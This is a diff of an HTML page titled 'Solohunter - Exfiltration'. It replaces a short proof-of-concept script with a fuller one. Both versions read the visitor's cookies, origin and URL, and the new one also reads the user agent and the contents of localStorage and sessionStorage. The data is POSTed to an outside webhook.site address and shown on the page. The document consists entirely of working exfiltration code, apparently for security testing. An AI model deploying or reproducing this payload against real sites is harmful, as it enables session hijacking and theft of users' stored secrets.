@@ -1,12 +1,30 @@
-<html><body><script>
-fetch('https://webhook.site/0090a7a3-5953-4053-b2f1-3498b6d1aae6', {
-  method: 'POST',
-  headers: {'Content-Type': 'application/json'},
-  body: JSON.stringify({
-    cookies: document.cookie,
-    origin: location.origin,
-    url: location.href
-  })
-});
-document.body.innerHTML = 'PoC running...';
-</script></body></html>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Solohunter - Exfiltration</title>
+</head>
+<body>
+    <pre id="output">Collecting data...</pre>
+    <script>
+        // Gather data
+        const data = {
+            cookies: document.cookie,
+            origin: location.origin,
+            url: location.href,
+            userAgent: navigator.userAgent,
+            localStorage: JSON.stringify(Object.entries(window.localStorage || {})),
+            sessionStorage: JSON.stringify(Object.entries(window.sessionStorage || {}))
+        };
+
+        // Send to webhook
+        fetch('https://webhook.site/0090a7a3-5953-4053-b2f1-3498b6d1aae6', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        }).catch(err => console.error('Exfil failed:', err));
+
+        // Display on page
+        document.getElementById('output').textContent = JSON.stringify(data, null, 2);
+    </script>
+</body>
+</html>
